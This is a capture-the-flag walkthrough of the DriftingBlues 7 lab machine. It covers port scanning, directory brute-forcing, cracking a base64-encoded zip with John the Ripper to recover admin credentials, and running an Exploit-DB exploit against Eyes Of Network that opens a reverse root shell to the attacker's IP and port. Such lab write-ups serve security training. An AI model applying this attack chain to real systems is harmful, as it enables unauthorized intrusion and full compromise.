nmap -sS -sV -p- -T4 10.0.0.25

PORT     STATE SERVICE         VERSION                                                                    
22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)                                                 
66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)                                        
80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)                                                                            
111/tcp  open  rpcbind         2-4 (RPC #100000)                                                          
443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)                                                                            
2403/tcp open  taskmaster2000?
3306/tcp open  mysql           MariaDB (unauthorized)
8086/tcp open  http            InfluxDB http admin 1.7.9

We have a couple of open ports, but only a few have an interest to us. We have 3 web servers and ssh.

dirsearch -u http://10.0.0.25:80

We find nothing, this webserver hosts "Eyes Of Network" (A supervision tool for hardware status, operating systems and applications), it has a login page, we will probably find credintals from the other web servers and log in.

root@kali ~# dirsearch -u http://10.0.0.25:66

[13:55:11] 200 -  176B  - /.bash_profile                                   
[13:55:11] 200 -  319B  - /.bash_history                                   
[13:55:12] 200 -  100B  - /.cshrc                                          
[13:55:13] 200 -  220B  - /.pki/                                           
[13:55:13] 301 -    0B  - /.pki  ->  /.pki/                                
[13:55:14] 200 -  129B  - /.tcshrc                                          
[13:55:31] 200 -    2KB - /flag.txt                                         
[13:55:33] 301 -    0B  - /index_files  ->  /index_files/                   
[13:55:33] 200 -   17KB - /index.htm

We have found the flag.

http://10.0.0.25:66/flag.txt:

flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

Ok we have the "found" the flag, we still need to gain access to the machine.

Maybe gobuster will find something. I tried the /dirb/common.txt wordlist but didn't find anything new, maybe a longer wordlist will help.

root@kali ~# gobuster dir -u http://10.0.0.25:66 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

/eon                  (Status: 200) [Size: 248]

Downloading the file and reading it ...

UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU
Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA
AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA
AQBbAAAARgAAAAAA

It seems like base64. Base64 decoded:

PK��R�I[�       creds.txt�s��p���-,&j2�C��G�bc������/�PK?��R�I[�        $ creds.txt
 ▒l��;�(���k6�(���k6�(�PK[F

I got stuck at this point, I thought there was a hidden text file. I outputed the decoded base64 message to a file.

root@kali ~/D/C/DriftingBlues#7# cat eon | base64 -d > file
root@kali ~/D/C/DriftingBlues#7# file file
file: Zip archive data, at least v2.0 to extract, compression method=store

We have a zip file, unzipping it requires a password. John The Ripper could help us here.

root@kali ~/D/C/DriftingBlues#7# zip2john file > fileHash

file.zip password ---> killah

Entering the password we get a credentials file.

creds.txt:
admin:isitreal31__

I tried using the credentials to login via ssh but there is no user named admin on the machine.
Logging in to the Eyes Of Network admin panel, I tried to find a place to upload a file or plugin, but found nothing.
I searched Eyes Of Network CVEs and found this one.

https://www.exploit-db.com/exploits/48025

After downloading it and using the command like this allowed to get a shell with root permissions.

root@kali ~/D/T/Privilege-Escalation# python3 48025 http://10.0.0.25 -ip 10.0.0.27 -port 4444 -user 'admin' -password 'isitreal31__'

sh-4.2# whoami
whoami
root

Going to the /root we can read the final flag.
 
flag 1/1
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

